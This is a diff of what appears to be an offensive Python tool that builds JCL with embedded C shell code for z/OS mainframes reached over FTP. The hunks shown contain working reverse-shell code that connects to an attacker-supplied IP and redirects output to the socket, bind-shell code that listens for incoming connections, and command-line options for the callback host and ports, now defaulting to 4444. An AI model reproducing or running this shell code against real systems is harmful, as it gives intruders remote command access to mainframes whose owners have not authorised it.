@@ -191,7 +191,7 @@ int main(int argc, char *argv[])
  sockfd = socket(AF_INET,SOCK_STREAM,0);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr=inet_addr("'''+ip+'''");
- sin.sin_port=htons('''+port+''');
+ sin.sin_port=htons('''+str(port)+''');
  connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
  dup2(sockfd,2);
  dup2(sockfd,1);
@@ -217,7 +217,7 @@ int main(int argc, char *argv[])
  sockfd = socket(AF_INET,SOCK_STREAM,0);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = 0;
- sin.sin_port = htons('''+port+''');
+ sin.sin_port = htons('''+str(port)+''');
  bind (sockfd,(struct sockaddr *)&sin,sizeof(sin));
  listen(sockfd,5);
  result = accept (sockfd,NULL,0);
@@ -570,9 +570,9 @@ parser.add_argument('-p','--port',help='z/OS FTP port, default is 21',default="2
 group = parser.add_mutually_exclusive_group()
 group.add_argument('-l','--listener',help='listener (bind) shell',action='store_true',default=False,dest='listener')
 group.add_argument('-r','--reverse',help='reverse shell',action='store_true',default=False,dest='reverse')
-parser.add_argument('--rport',help='Listener port. If it fails try >1024',dest='rport')
+parser.add_argument('--rport',help='Listener port. If it fails try >1024',default='4444',dest='rport')
 parser.add_argument('--lhost',help='Remote server to call back to (aka Your IP address)',dest='lhost')
-parser.add_argument('--lport',help='Remote port to use',dest='lport')
+parser.add_argument('--lport',help='Remote port to use',default='4444',dest='lport')
 parser.add_argument('--print',help='Just print the JCL to the screen',action='store_true',default=False,dest='dotmatrix')
 parser.add_argument('--logo',help='Ugly ASCII Art Logo. Its sorta my thing now.', default=False,dest='logo',action='store_true')
 parser.add_argument('-v','--verbose',help='Verbose mode. More verbosity', default=False,dest='debug',action='store_true')
